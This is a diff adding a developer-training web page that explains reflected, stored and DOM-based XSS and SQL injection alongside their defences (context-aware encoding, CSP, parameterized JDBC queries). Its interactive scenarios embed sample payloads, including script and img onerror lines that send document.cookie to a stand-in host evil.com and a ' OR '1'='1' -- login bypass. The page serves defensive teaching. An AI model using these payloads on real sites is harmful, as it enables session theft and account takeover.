@@ -1,0 +1,346 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>XSS &amp; SQL Injection — Attacking (and Defending) User Input</title>
+  <style>
+    .who-IN{background:#f87171;color:#450a0a}
+    .who-SINK{background:#fbbf24;color:#452b00}
+    .who-EXEC{background:#a78bfa;color:#1a1030}
+    .who-IMPACT{background:#fb923c;color:#3a1600}
+    .who-DEF{background:#4ade80;color:#04231a}
+    .who-row{display:flex;flex-wrap:wrap;gap:7px;margin:18px 0 0}
+    .who-badge{font-size:11px;font-weight:700;letter-spacing:.04em;padding:3px 10px;border-radius:12px;font-family:ui-monospace,monospace}
+    .cmp{display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:12px;margin:10px 0}
+    .cmp-col{border-radius:12px;padding:14px 16px}
+    .cmp-bad{background:rgba(248,113,113,.08);border:1px solid rgba(248,113,113,.28)}
+    .cmp-good{background:rgba(74,222,128,.08);border:1px solid rgba(74,222,128,.28)}
+    .cmp-col h4{margin:0 0 8px;font-size:11.5px;font-weight:800;text-transform:uppercase;letter-spacing:.05em}
+    .cmp-bad h4{color:#fca5a5}.cmp-good h4{color:#86efac}
+    .key-insight{background:rgba(99,102,241,.07);border:1px solid rgba(99,102,241,.3);border-radius:8px;padding:14px;margin:12px 0;font-size:13px}
+    .key-insight strong{color:#a78bfa}
+    .xlink{font-size:11.5px;color:var(--blue)}
+  </style>
+  <link rel="stylesheet" href="devhub.css" />
+</head>
+<body class="track-identity">
+<div class="container">
+  <a class="back" href="app.html">&larr; Dev Hub</a>
+  <h1>XSS &amp; SQL Injection — Attacking (and Defending) User Input</h1>
+  <p class="sub">Two of the OWASP Top 10's most common findings, both caused by the exact same mistake: untrusted input lands in a context that has its own grammar — HTML, JavaScript, or SQL — without being escaped or parameterized first, so the interpreter can't tell attacker <em>data</em> from attacker <em>code</em>.</p>
+
+  <!-- ── INTRO ── -->
+  <div class="intro">
+    <div class="intro-head"><span class="ico">💉</span> What makes an "injection" attack, and why is it always the same root cause?</div>
+    <p class="intro-lead">
+      Every injection attack — <strong>XSS</strong> in the browser, <strong>SQL injection</strong> in the database, command injection in a shell — follows one pattern: attacker-controlled text is concatenated into a string that an interpreter (the HTML parser, the SQL engine, the OS shell) is about to read <em>as syntax</em>, without first marking where the data ends and the syntax begins. <code>&lt;script&gt;</code> in an HTML response becomes a real tag. A stray <code>'</code> in a SQL string becomes the end of a literal and the start of new SQL. The fix is always the same shape too: <strong>never build the target string by concatenation</strong> — use context-aware output encoding for HTML, and parameter binding for SQL, so the interpreter is structurally incapable of treating your data as its own syntax.
+    </p>
+    <ul class="intro-gist">
+      <li><b>Same bug, three targets:</b> HTML/JS (XSS), SQL (SQLi), OS commands (command injection) — the interpreter can't distinguish data from code.</li>
+      <li><b>Reflected vs Stored vs DOM-based XSS</b> differ only in <em>where</em> the unescaped input round-trips through.</li>
+      <li><b>Encoding must match the context</b> — HTML-encoding a value that lands inside a <code>&lt;script&gt;</code> block doesn't help; there's no single universal "sanitize" function.</li>
+      <li><b>Parameterized queries don't "escape" SQL — they never let attacker input become SQL text at all.</b></li>
+    </ul>
+    <div class="intro-cards">
+      <div class="intro-mini">
+        <h4>Angular's default posture</h4>
+        <p>Angular auto-escapes everything bound via interpolation (<code>{{ value }}</code>) and property binding — it's XSS-safe by default. The danger zone is anything that opts back into raw HTML: <code>[innerHTML]</code>, <code>bypassSecurityTrustHtml()</code>, or hand-rolled DOM writes like <code>el.innerHTML = …</code>.</p>
+      </div>
+      <div class="intro-mini">
+        <h4>This app's own SQL pattern</h4>
+        <p>Every repo in the scaffold's JDBC layer uses <code>NamedParameterJdbcTemplate</code> with a <code>MapSqlParameterSource</code> — <code>:email</code>, never string concatenation. That isn't a style choice; it's the thing that makes SQL injection structurally impossible against these queries.</p>
+      </div>
+      <div class="intro-mini">
+        <h4>Defense in depth</h4>
+        <p>Output encoding / parameterization is the primary fix, but layer on a <b>Content-Security-Policy</b> header (blocks inline <code>&lt;script&gt;</code> even if one slips through) and <b>httpOnly</b> cookies (limits what a successful XSS can actually steal).</p>
+      </div>
+    </div>
+    <div class="intro-ciam"><span class="tag">CIAM:</span> Session/auth cookies should always be <code>HttpOnly</code> (JS can't read them, so XSS can't exfiltrate them directly) and <code>Secure</code>+<code>SameSite</code>. A Bearer JWT kept in <code>localStorage</code> instead of a cookie sidesteps CSRF (see the CSRF page) but is fully readable by any XSS on the page — which is exactly why an app that stores tokens in JS memory/localStorage has to take XSS defense even more seriously, not less.</div>
+  </div>
+
+  <!-- ── EXTREME-VIZ HERO ── -->
+  <div style="margin:0 0 28px">
+    <div class="rt-ctlbar">
+      <span class="lbl">scenario:</span>
+      <span class="userseg" id="ajSeg">
+        <button class="on" data-s="reflected">① Reflected XSS</button>
+        <button data-s="stored">② Stored XSS</button>
+        <button data-s="dom">③ DOM-based XSS</button>
+        <button data-s="sqli">④ SQL injection</button>
+        <button data-s="safe">⑤ Defended</button>
+      </span>
+      <button class="rt-run" id="ajRun">▶ Play</button>
+      <span class="rt-pill" id="ajPill">ready</span>
+    </div>
+    <div class="rt-stage">
+      <div class="rt-diagram" id="ajDiagram"></div>
+      <div class="rt-inspect">
+        <span class="rt-dir" id="ajDir">▶ READY</span>
+        <div class="rt-cap" id="ajCap">Pick a scenario and press ▶ Play</div>
+        <div class="rt-payload" id="ajPay"></div>
+        <div class="rt-headers" id="ajHdr"></div>
+        <div class="rt-result" id="ajRes"></div>
+      </div>
+    </div>
+    <div class="who-row">
+      <span class="who-badge who-IN">IN — untrusted input</span>
+      <span class="who-badge who-SINK">SINK — where it lands</span>
+      <span class="who-badge who-EXEC">EXEC — parsed as code?</span>
+      <span class="who-badge who-IMPACT">IMPACT — what attacker gets</span>
+      <span class="who-badge who-DEF">DEF — the checkpoint</span>
+    </div>
+  </div>
+
+  <!-- 1 -->
+  <section>
+    <h2>1. Reflected vs Stored vs DOM-based XSS</h2>
+    <table>
+      <tr><th>Type</th><th>Where the payload lives</th><th>Who's affected</th><th>Needs server involvement?</th></tr>
+      <tr><td><b>Reflected</b></td><td>The URL/request itself (query param, form field) — echoed straight back into the response</td><td>Only the victim who clicks the crafted link</td><td>Yes — server reflects it, unescaped</td></tr>
+      <tr><td><b>Stored</b></td><td>Saved server-side (a comment, profile bio, ticket description) — rendered to <em>every</em> viewer</td><td>Every visitor who views the poisoned page — no click required</td><td>Yes — server persists and later re-serves it, unescaped</td></tr>
+      <tr><td><b>DOM-based</b></td><td>Never touches the server at all — client-side JS reads <code>location.hash</code>/<code>search</code> and writes it straight into the DOM</td><td>Only the victim who opens the crafted link</td><td><b>No</b> — purely client-side; server-side output encoding can't fix this</td></tr>
+    </table>
+    <div class="key-insight"><strong>Stored is the worst of the three</strong> — one successful write compromises every future viewer with zero further attacker effort. <strong>DOM-based is the sneakiest</strong> — it can pass every server-side security review, because the vulnerable code never sends the tainted string to the server at all.</div>
+  </section>
+
+  <!-- 2 -->
+  <section>
+    <h2>2. XSS defense: encode for the context you're writing into</h2>
+    <p style="color:var(--muted);font-size:13px;line-height:1.7;margin:0 0 10px">There's no single universal "sanitize" function — the correct escaping depends entirely on <em>where</em> the value is being written.</p>
+    <table>
+      <tr><th>Context</th><th>Example sink</th><th>Correct encoding</th></tr>
+      <tr><td>HTML body text</td><td><code>&lt;p&gt;Hello, {name}&lt;/p&gt;</code></td><td>HTML-entity encode <code>&amp; &lt; &gt; " '</code></td></tr>
+      <tr><td>HTML attribute</td><td><code>&lt;img alt="{name}"&gt;</code></td><td>HTML-attribute encode (also handles <code>"</code> breaking out of the quote)</td></tr>
+      <tr><td>Inside a <code>&lt;script&gt;</code> block</td><td><code>var name = "{name}";</code></td><td>JS-string encode — HTML-encoding does <em>not</em> stop <code>"; alert(1); //</code></td></tr>
+      <tr><td>URL / query param</td><td><code>&lt;a href="/search?q={q}"&gt;</code></td><td><code>encodeURIComponent</code> — different rules than HTML encoding</td></tr>
+    </table>
+    <div class="cmp">
+      <div class="cmp-col cmp-bad">
+        <h4>✗ Angular — opts back into risk</h4>
+        <pre><span class="cm">// [innerHTML] renders raw HTML — attacker XSS runs</span>
+&lt;div [innerHTML]<span class="op">=</span><span class="str">"comment.body"</span>&gt;&lt;/div&gt;
+
+<span class="cm">// bypassSecurityTrustHtml explicitly disables Angular's sanitizer</span>
+<span class="kw">this</span>.safeHtml <span class="op">=</span> <span class="kw">this</span>.sanitizer
+  .<span class="fn">bypassSecurityTrustHtml</span>(comment.body);</pre>
+      </div>
+      <div class="cmp-col cmp-good">
+        <h4>✓ Angular — default, safe</h4>
+        <pre><span class="cm">// Interpolation is ALWAYS auto-escaped by Angular</span>
+&lt;div&gt;{{ comment.body }}&lt;/div&gt;
+<span class="cm">// A literal &lt;script&gt; renders as visible, inert text</span></pre>
+      </div>
+    </div>
+    <p class="xlink">↪ Add a <b>Content-Security-Policy</b> header as a second layer — even if an encoding bug slips through, <code>script-src 'self'</code> blocks inline/attacker-hosted scripts from executing.</p>
+  </section>
+
+  <!-- 3 -->
+  <section>
+    <h2>3. SQL injection: string concatenation vs. parameter binding</h2>
+    <div class="cmp">
+      <div class="cmp-col cmp-bad">
+        <h4>✗ Vulnerable — concatenated SQL</h4>
+        <pre><span class="type">String</span> sql <span class="op">=</span>
+  <span class="str">"SELECT * FROM users WHERE email = '"</span>
+  <span class="op">+</span> email <span class="op">+</span> <span class="str">"'"</span>;
+stmt.<span class="fn">execute</span>(sql);
+<span class="cm">// email = "' OR '1'='1' --"</span>
+<span class="cm">// query becomes: ...WHERE email = '' OR '1'='1' --'</span>
+<span class="cm">// always true → returns the FIRST row, often an admin</span></pre>
+      </div>
+      <div class="cmp-col cmp-good">
+        <h4>✓ This app's actual pattern</h4>
+        <pre><span class="cm">// UserQuery.java — a named-param constant</span>
+<span class="kw">public static final</span> <span class="type">String</span> SELECT_BY_EMAIL <span class="op">=</span>
+  <span class="str">"SELECT * FROM users WHERE email = :email"</span>;
+
+<span class="cm">// UserRepoImpl.java</span>
+<span class="type">MapSqlParameterSource</span> params <span class="op">=</span>
+  <span class="kw">new</span> <span class="type">MapSqlParameterSource</span>(<span class="str">"email"</span>, email);
+jdbc.<span class="fn">queryForObject</span>(SELECT_BY_EMAIL, params, rowMapper);</pre>
+      </div>
+    </div>
+    <div class="key-insight"><strong><code>NamedParameterJdbcTemplate</code> doesn't "escape" the input — it never lets the input become SQL text at all.</strong> The driver sends the query text and the parameter value to the database <em>separately</em>; the DB engine treats <code>:email</code>'s value as a literal, full stop, no matter what characters it contains. That's a structural guarantee, not a best-effort filter — which is exactly why this scaffold's whole JDBC layer (see <code>repo/repoimpl/</code> across every aggregate) is built on it by default.</div>
+  </section>
+
+  <!-- 4 -->
+  <section>
+    <h2>4. One-sentence recap</h2>
+    <div class="card card-accent">
+      <p style="font-size:14px">💉 Injection — XSS, SQL injection, and their relatives — is always the same bug: <strong>untrusted input reaches an interpreter that has its own grammar without being escaped for that exact context or bound as a literal parameter</strong>; the fix is never a single "sanitize everything" function, it's <strong>context-aware output encoding</strong> in the browser (Angular's default interpolation, a <code>Content-Security-Policy</code>) and <strong>parameter binding, never concatenation</strong>, in the database.</p>
+    </div>
+    <p class="xlink" style="margin-top:8px">↪ See also: <a href="spring-boot-csrf-deep-visualizer.html">CSRF Protection</a> (a different attack — forged requests, not injected code), <a href="rbac-deep-visualizer.html">RBAC &amp; Authorization</a>, and the full <a href="appsec-owasp-top10-visualizer.html">OWASP Top 10 checklist</a> this page's two categories (A03: Injection) fit into.</p>
+  </section>
+</div>
+
+<!-- Code Walkthrough: fixing a vulnerable repo method -->
+<h2 id="cw-appsec" style="margin:0 0 4px;padding:0 1.5rem;max-width:clamp(40rem,94vw,90rem);margin-left:auto;margin-right:auto">👣 Step through it, line by line</h2>
+<div id="cw-appsec-mount"></div>
+<script src="devhub-codewalk.js"></script>
+<script>
+DevHubCodeWalk.mount('#cw-appsec-mount', {
+  title: 'UserRepoImpl.java — from concatenated SQL to a parameterized query',
+  intervalMs: 1700,
+  code: [
+    '// ✗ BEFORE — string concatenation (SQL-injectable)',
+    'String sql = "SELECT * FROM users WHERE email = \'" + email + "\'";',
+     'return jdbc.queryForObject(sql, userRowMapper);',
+    '',
+    '// ✓ AFTER — UserQuery.java (named-param SQL constant)',
+    'public static final String SELECT_BY_EMAIL =',
+    '    "SELECT * FROM users WHERE email = :email";',
+    '',
+    '// ✓ AFTER — UserRepoImpl.java',
+    'MapSqlParameterSource params =',
+    '    new MapSqlParameterSource("email", email);',
+    'try {',
+    '  return jdbc.queryForObject(SELECT_BY_EMAIL, params, userRowMapper);',
+    '} catch (EmptyResultDataAccessException e) {',
+    '  return null; // not-found, mapped to a 404 upstream',
+    '}',
+  ],
+  steps: [
+    { line: 1, note: "This is the vulnerable version: email is concatenated directly into the SQL text. If email contains a single quote, the attacker controls everything after it — including turning the WHERE clause into something that's always true.", vars: { email: "' OR '1'='1' --", resultingSql: "...WHERE email = '' OR '1'='1' --'" }, tone: 'bad' },
+    { line: 2, note: "The database has no way to know the quote in email wasn't meant to be there — it just parses whatever text it received as SQL. This is the moment attacker DATA becomes database CODE.", vars: { returns: 'the first row in the table — often an admin account' }, tone: 'bad' },
+    { line: 6, note: "The fix starts here: the SQL text uses a named placeholder, :email, instead of a literal value. This constant lives in a Query class per this codebase's own convention (see the scaffold's query/ package) — the SQL text itself never changes based on input.", vars: { placeholder: ':email' } },
+    { line: 10, note: "MapSqlParameterSource is where the actual value is bound — completely separate from the SQL text above it.", vars: { boundValue: "' OR '1'='1' --" }, tone: 'ok' },
+    { line: 13, note: "NamedParameterJdbcTemplate sends the SQL text and the parameter value to the JDBC driver as two separate things. The driver — and the database behind it — treats the bound value as a literal string, no matter what characters it contains. The attacker's quote is just... a quote, inside a string.", vars: { emailLiteralMatchedAgainst: "the literal string \"' OR '1'='1' --\"", rowsReturned: 0 }, tone: 'ok', callout: "This is why the scaffold's entire repo/repoimpl/ layer is built on NamedParameterJdbcTemplate: SQL injection isn't filtered out here, it's structurally impossible against these queries in the first place." },
+    { line: 14, note: "EmptyResultDataAccessException is Spring JDBC's way of saying 'no row matched' — the repo maps that to null/not-found rather than letting an exception leak a stack trace (or worse, a different response shape that reveals whether an email exists at all).", vars: { onNoMatch: 'null → mapped to 404 upstream' } },
+  ]
+});
+</script>
+
+<script>
+(function(){
+  const P='aj', $=id=>document.getElementById(id);
+  const SCEN={
+    reflected:{ req:'GET /search?q=<script>…', intro:'Reflected XSS lives entirely in the attacker\'s own request — the server echoes the query string back into the HTML response without encoding, and the victim\'s browser runs it the instant they click a crafted link.',
+      nodes:[
+        {id:'in',icon:'🧑‍💻',nl:'GET /search?q=<script>…',ns:'crafted link, victim clicks',who:'IN'},
+        {id:'sink',icon:'🕳️',nl:'<p>Results for: ${q}</p>',ns:'no HTML encoding',who:'SINK'},
+        {id:'exec',icon:'⚙️',nl:'browser parses it as a real <script>',ns:'executes attacker JS',who:'EXEC'},
+        {id:'impact',icon:'💥',nl:"fetch(evil.com, document.cookie)",ns:'cookie exfiltrated',who:'IMPACT'},
+        {id:'def',icon:'🛡️',nl:'HTML-encode q before interpolating',ns:'MISSING — this is the bug',who:'DEF'},
+      ],
+      steps:[
+        {node:'in',chip:'GET',cap:'Attacker crafts a link with a malicious query param and gets the victim to click it',pay:{url:"https://app.com/search?q=<script>fetch('//evil.com/steal?c='+document.cookie)<\/script>",delivery:'phishing email / chat link'},ins:'Reflected XSS starts with the attacker\'s OWN request — they just need the victim to click a link, not to have any account or write access to the app.'},
+        {node:'sink',chip:'render',tone:'ok',cap:'Server template interpolates q directly into the HTML response — no encoding',pay:{serverCode:'<p>Results for: ${req.query.q}</p>',encodingApplied:false},ins:'The moment the raw query string is written into an HTML response body, the sink is live. This is a one-line mistake — a template that "just works" for normal search terms.'},
+        {node:'exec',chip:'parse',tone:'bad',cap:'Victim\'s browser parses the response — the <script> tag is now a REAL tag, not text',pay:{browserSees:'<p>Results for: <script>fetch(...)<\/script></p>',parsedAs:'executable script element'},ins:'The browser has no way to know this <script> tag "shouldn\'t" be there — from its perspective, the server sent HTML containing a script tag, so it runs it, same as any other script on the page.'},
+        {node:'impact',chip:'exfil',tone:'bad',cap:'The script runs in the victim\'s origin and exfiltrates their session cookie',pay:{stolen:'document.cookie',sentTo:'evil.com/steal',requiresVictimAction:'one click on the crafted link'},ins:'"Runs in the victim\'s origin" is the whole danger — the script has the same access to cookies, localStorage, and the DOM that the app\'s own legitimate JavaScript has.'},
+        {node:'def',chip:'gap',tone:'bad',cap:'What should have run here: HTML-encode q before interpolating — it did not',pay:{shouldHaveEncoded:'&lt;script&gt;...&lt;/script&gt; (rendered as inert visible text)',actuallyHappened:'raw, unescaped interpolation'},ins:'A single missing encode() call is the entire vulnerability. There is no "mostly safe" here — either every non-alphanumeric character reaching this sink is encoded, or it isn\'t.'},
+      ], result:{cls:'bad',text:'💥 Reflected XSS: the payload lives in the attacker\'s own request, echoed back unescaped, and executes the instant the victim opens the crafted link.'} },
+
+    stored:{ req:'POST /comments {body}', intro:'Stored XSS is worse than reflected — one malicious write persists to the database and re-fires against every future visitor, with no click required beyond viewing the page.',
+      nodes:[
+        {id:'in',icon:'🧑‍💻',nl:'comment: <img src=x onerror=…>',ns:'submitted via comment form',who:'IN'},
+        {id:'sink',icon:'🕳️',nl:'saved raw, rendered to every visitor',ns:'no sanitize on write or read',who:'SINK'},
+        {id:'exec',icon:'⚙️',nl:"onerror fires on every viewer's page",ns:'executes for each visitor',who:'EXEC'},
+        {id:'impact',icon:'💥',nl:"every viewer's cookie exfiltrated",ns:'mass compromise, no click needed',who:'IMPACT'},
+        {id:'def',icon:'🛡️',nl:'escape on output / allowlist sanitizer',ns:'MISSING — this is the bug',who:'DEF'},
+      ],
+      steps:[
+        {node:'in',chip:'POST',cap:'Attacker submits a blog comment containing a payload — no click needed from anyone yet',pay:{comment:'Nice post! <img src=x onerror="fetch(\'//evil.com/steal?c=\'+document.cookie)">',submittedBy:'attacker, via the normal comment form'},ins:'Stored XSS begins with a normal, authenticated (or even anonymous) write — the attacker doesn\'t need to trick anyone at this stage, just submit a form like any real user.'},
+        {node:'sink',chip:'store',tone:'ok',cap:'Comment is saved to the database exactly as submitted, then rendered to every visitor',pay:{storedRaw:true,renderedTo:'every future visitor of this comment thread',sanitizedOnWrite:false,sanitizedOnRead:false},ins:'Neither write-time nor read-time sanitization happened. The payload now sits in the database, waiting to be re-served to anyone who loads the page — no further attacker action required.'},
+        {node:'exec',chip:'fire',tone:'bad',cap:'Every subsequent visitor\'s browser parses the <img onerror=...> — the handler fires on the (deliberately broken) image load failure',pay:{trigger:'onerror fires because src=x is not a real image',affectedUsers:'everyone who views the comment thread'},ins:'onerror is a classic stored-XSS trick — it doesn\'t need a <script> tag at all (which some naive filters block), just any HTML attribute that accepts JavaScript.'},
+        {node:'impact',chip:'exfil',tone:'bad',cap:'Mass compromise: every viewer\'s cookie is exfiltrated, with zero click required beyond loading the page',pay:{scale:'every page view, indefinitely, until the comment is removed',victimAction:'none — just viewing the page'},ins:'This is what makes stored XSS strictly worse than reflected: the attacker\'s work is done once, and the exploit re-fires automatically for every future viewer.'},
+        {node:'def',chip:'gap',tone:'bad',cap:'Should have escaped on output (or sanitized allowed HTML on input) — neither happened',pay:{fix1:'HTML-encode on render, regardless of what was stored',fix2:'or: a strict allowlist sanitizer (e.g. only <b>/<i>/<a href> permitted) applied on write'},ins:'Escaping on OUTPUT is the more robust fix — even if something bad already made it into the database (a bug, a migration, an old record), it still renders as inert text.'},
+      ], result:{cls:'bad',text:'💥 Stored XSS: one poisoned write compromises every future viewer — no interaction beyond loading the page is required.'} },
+
+    dom:{ req:'GET /profile#<img onerror=…>', intro:'DOM-based XSS never touches the server — the fragment after # isn\'t even sent in the HTTP request, so the vulnerable code and the fix are both entirely client-side.',
+      nodes:[
+        {id:'in',icon:'🧑‍💻',nl:'#<img src=x onerror=alert(cookie)>',ns:'payload in the URL fragment',who:'IN'},
+        {id:'sink',icon:'🕳️',nl:'el.innerHTML = location.hash.slice(1)',ns:'entirely client-side',who:'SINK'},
+        {id:'exec',icon:'⚙️',nl:'browser parses the innerHTML write',ns:'server never even saw this',who:'EXEC'},
+        {id:'impact',icon:'💥',nl:"script executes in victim's browser",ns:'server-side fixes powerless',who:'IMPACT'},
+        {id:'def',icon:'🛡️',nl:'use textContent, not innerHTML',ns:'MISSING — this is the bug',who:'DEF'},
+      ],
+      steps:[
+        {node:'in',chip:'GET#',cap:'Attacker sends a link where the payload lives in the URL FRAGMENT, after the #',pay:{url:'https://app.com/profile#<img src=x onerror=alert(document.cookie)>',note:'everything after # is the "fragment" / hash'},ins:'The URL fragment is special: browsers never send it to the server as part of the HTTP request. This detail is what makes the whole attack class different from reflected/stored XSS.'},
+        {node:'sink',chip:'write',tone:'ok',cap:'Client-side JS reads location.hash and writes it straight into the DOM',pay:{clientCode:"document.getElementById('name').innerHTML = location.hash.slice(1);",runsOn:'page load, entirely in the browser'},ins:'This line never talks to the server at all. A server-side security review — even a very good one — would find nothing wrong, because the vulnerable code path is 100% client-side.'},
+        {node:'exec',chip:'parse',tone:'bad',cap:'Browser parses the innerHTML assignment and executes the onerror handler',pay:{trigger:'innerHTML write containing <img onerror=...>',serverInvolvement:'none — the fragment was never even sent in the HTTP request'},ins:'The interpreter here is the browser\'s own HTML parser, triggered by JavaScript the page itself wrote — not by anything the server returned.'},
+        {node:'impact',chip:'exec',tone:'bad',cap:'Script executes in the victim\'s browser purely from the URL — the request/response cycle is irrelevant',pay:{requiresServerFix:false,requiresClientFix:true},ins:'This is the key lesson: server-side output encoding, WAFs, and request-inspecting middleware are all powerless here — the payload physically never reaches the server to be inspected.'},
+        {node:'def',chip:'gap',tone:'bad',cap:'Fix has to be client-side: never route untrusted strings through innerHTML',pay:{fix1:'use textContent instead of innerHTML for plain text',fix2:'in Angular: rely on {{ }} interpolation, which auto-escapes — never manually assign to .innerHTML'},ins:'Angular sidesteps this entire class by design: its interpolation binding never uses innerHTML under the hood for plain values, so the "obvious" way to write Angular code is already the safe way.'},
+      ], result:{cls:'bad',text:'💥 DOM-based XSS never touches the server — the fragment isn\'t even sent in the HTTP request, so the fix must be client-side.'} },
+
+    sqli:{ req:"POST /login {email:\"' OR 1=1--\"}", intro:'Classic SQL injection: attacker input breaks out of the intended string literal because the query was built with concatenation instead of a bound parameter.',
+      nodes:[
+        {id:'in',icon:'🧑‍💻',nl:"email = ' OR '1'='1' --",ns:'submitted via login form',who:'IN'},
+        {id:'sink',icon:'🕳️',nl:'"...WHERE email = \'" + email + "\'"',ns:'string concatenation',who:'SINK'},
+        {id:'exec',icon:'⚙️',nl:"WHERE email = '' OR '1'='1' --'",ns:'always-true WHERE clause',who:'EXEC'},
+        {id:'impact',icon:'💥',nl:'returns first row — often an admin',ns:'login bypass, no password needed',who:'IMPACT'},
+        {id:'def',icon:'🛡️',nl:'NamedParameterJdbcTemplate + :email',ns:'MISSING — this is the bug',who:'DEF'},
+      ],
+      steps:[
+        {node:'in',chip:'POST',cap:'Attacker submits a login email crafted to break out of the intended SQL string literal',pay:{submittedEmail:"' OR '1'='1' --",via:'a normal login form field'},ins:'Just like stored XSS, this starts as a completely ordinary form submission — nothing about the HTTP request itself looks abnormal.'},
+        {node:'sink',chip:'concat',tone:'ok',cap:'Repo method builds the query via string concatenation',pay:{vulnerableCode:'"SELECT * FROM users WHERE email = \'" + email + "\'"',parameterBinding:false},ins:'This is the entire vulnerability, in one line: the attacker-controlled string is spliced directly into SQL text before the database ever sees it.'},
+        {node:'exec',chip:'parse',tone:'bad',cap:'Database parses the resulting text — the attacker\'s quote closes the string literal early',pay:{resultingSql:"SELECT * FROM users WHERE email = '' OR '1'='1' --'",parsedAs:'a WHERE clause that is unconditionally TRUE'},ins:'The `--` comments out the trailing quote so the SQL stays syntactically valid. The database has no concept of "attacker input" — it just parses valid SQL, which is exactly what it received.'},
+        {node:'impact',chip:'bypass',tone:'bad',cap:'Query returns the FIRST row in the users table — often an admin account created first',pay:{result:'authenticated as an arbitrary user without knowing any password',severity:'full account takeover, potentially privilege escalation'},ins:'This is the mildest possible outcome of this bug class — the same technique (UNION SELECT, stacked queries) can be used to dump entire tables or, on some drivers, execute further commands.'},
+        {node:'def',chip:'gap',tone:'bad',cap:'Should have used NamedParameterJdbcTemplate with a bound :email parameter — it did not',pay:{fix:'MapSqlParameterSource("email", email) + "WHERE email = :email"',guarantee:'the DB driver sends the value separately from the SQL text — it can never become SQL syntax'},ins:'Note this isn\'t "escaping" — the fix doesn\'t clean up the string, it changes the entire mechanism so the string is never part of the SQL text to begin with.'},
+      ], result:{cls:'bad',text:'💥 Classic SQLi: the \' character breaks out of the intended string literal because it was concatenated raw into the query text.'} },
+
+    safe:{ req:'Same payloads, defended stack', intro:'Same two payloads, defended stack: context-aware output encoding on the client and parameter binding on the server mean neither one is ever interpreted as code.',
+      nodes:[
+        {id:'in',icon:'🧑‍💻',nl:'same XSS + SQLi payloads, together',ns:'against a defended endpoint',who:'IN'},
+        {id:'sink',icon:'🕳️',nl:'{{ }} interpolation + :email binding',ns:'Angular + NamedParameterJdbcTemplate',who:'SINK'},
+        {id:'exec',icon:'⚙️',nl:'treated as inert text / literal value',ns:'never parsed as code',who:'EXEC'},
+        {id:'impact',icon:'✅',nl:'0 rows changed, nothing executes',ns:'no compromise',who:'IMPACT'},
+        {id:'def',icon:'🛡️',nl:'context-aware encoding + parameter binding',ns:'ACTIVE — this is the fix firing',who:'DEF'},
+      ],
+      steps:[
+        {node:'in',chip:'POST',cap:'Same two payloads sent together, against a properly defended endpoint',pay:{xssPayload:'<img src=x onerror=alert(1)>',sqliPayload:"' OR '1'='1' --"},ins:'Nothing about the attacker\'s request changes here — the defense lives entirely in how the app handles what it receives, not in filtering what comes in.'},
+        {node:'sink',chip:'bind',tone:'ok',cap:'Angular renders via {{ }} interpolation (never [innerHTML]); the repo uses NamedParameterJdbcTemplate',pay:{frontend:'{{ comment.body }} — auto-escaped by Angular\'s sanitizer',backend:'MapSqlParameterSource("email", email) — bound, not concatenated'},ins:'Both fixes are structural, not "extra validation bolted on" — they\'re just the default, idiomatic way to write this code in each framework.'},
+        {node:'exec',chip:'inert',tone:'ok',cap:'Browser treats the XSS payload as inert text; DB driver sends the SQLi string as a literal value',pay:{browserRenders:'&lt;img src=x onerror=alert(1)&gt; — visible as literal text, never parsed as a tag',dbBinds:"the literal string \"' OR '1'='1' --\" as the :email parameter value"},ins:'Same payload characters as before — completely different outcome, because the interpreter never gets a chance to treat them as syntax in either case.'},
+        {node:'impact',chip:'0 rows',tone:'ok',cap:'No script executes; SQL query runs safely and returns zero matching rows',pay:{xssOutcome:'payload displayed on-screen as literal text',sqliOutcome:'0 rows — no user has that literal email address'},ins:'The "impact" of a well-defended input is that it just... behaves like normal data. Nothing dramatic happens, which is exactly the point.'},
+        {node:'def',chip:'fix',tone:'ok',cap:'This is the defense actually firing, on both fronts, by default',pay:{clientDefense:'context-aware output encoding (Angular interpolation)',serverDefense:'parameter binding (NamedParameterJdbcTemplate)'},ins:'Neither defense required the developer to think about THIS specific attacker payload — they work against every payload, because they change the mechanism, not the input.'},
+      ], result:{cls:'ok',text:'✅ Same two payloads, defended stack: neither input is ever interpreted as code — one is escaped before reaching the DOM, the other is bound as a literal value before reaching the SQL parser.'} },
+  };
+
+  let scen='reflected', running=false, timers=[];
+  function clearT(){timers.forEach(clearTimeout);timers=[];}
+  function nodeEl(id){return document.querySelector('#'+P+'Diagram .rt-node[data-node="'+id+'"]');}
+  function nodeCenter(id){const n=nodeEl(id);return n?n.offsetTop+n.offsetHeight/2:0;}
+  function renderNodes(k){
+    let h='<div class="rt-rail"></div><div class="rt-chip" id="'+P+'Chip">→</div>';
+    SCEN[k].nodes.forEach(n=>{ h+='<div class="rt-node" data-node="'+n.id+'"><span class="ic">'+n.icon+'</span><div style="flex:1;min-width:0"><div class="nl">'+n.nl+'</div><div class="ns">'+n.ns+'</div></div><span class="who who-'+n.who+'">'+n.who+'</span></div>'; });
+    $(P+'Diagram').innerHTML=h;
+  }
+  function reset(){
+    renderNodes(scen); const s=SCEN[scen];
+    const chip=$(P+'Chip'); chip.style.transition='none'; chip.style.top=nodeCenter(s.steps[0].node)+'px'; chip.style.opacity='0'; chip.classList.remove('ok','bad'); void chip.offsetWidth; chip.style.transition='';
+    $(P+'Res').className='rt-result';
+    $(P+'Dir').textContent='▶ READY'; $(P+'Dir').className='rt-dir';
+    $(P+'Cap').textContent=s.intro;
+    $(P+'Pay').textContent='';
+    $(P+'Hdr').innerHTML='<span class="ht">live inspector</span>— the payload, sink, and impact appear here per step —';
+    $(P+'Pill').textContent=s.req;
+    document.querySelectorAll('#'+P+'Seg button').forEach(b=>b.disabled=false); $(P+'Run').disabled=false;
+  }
+  function applyStep(steps,i){
+    const st=steps[i];
+    document.querySelectorAll('#'+P+'Diagram .rt-node').forEach(n=>n.classList.remove('cur','curbad','rtpulse'));
+    const n=nodeEl(st.node); n.classList.remove('vchk','vskip'); n.classList.add(st.tone==='bad'?'vskip':'vchk'); n.classList.add('cur'); if(st.tone==='bad')n.classList.add('curbad'); void n.offsetWidth; n.classList.add('rtpulse');
+    const chip=$(P+'Chip'); chip.textContent=st.chip||'→'; chip.classList.remove('ok','bad'); if(st.tone)chip.classList.add(st.tone==='bad'?'bad':'ok'); chip.style.opacity='1'; chip.style.top=nodeCenter(st.node)+'px';
+    $(P+'Dir').textContent=st.dir||('STEP '+(i+1)+' / '+steps.length); $(P+'Dir').className='rt-dir'+(st.tone==='bad'?' bad':'');
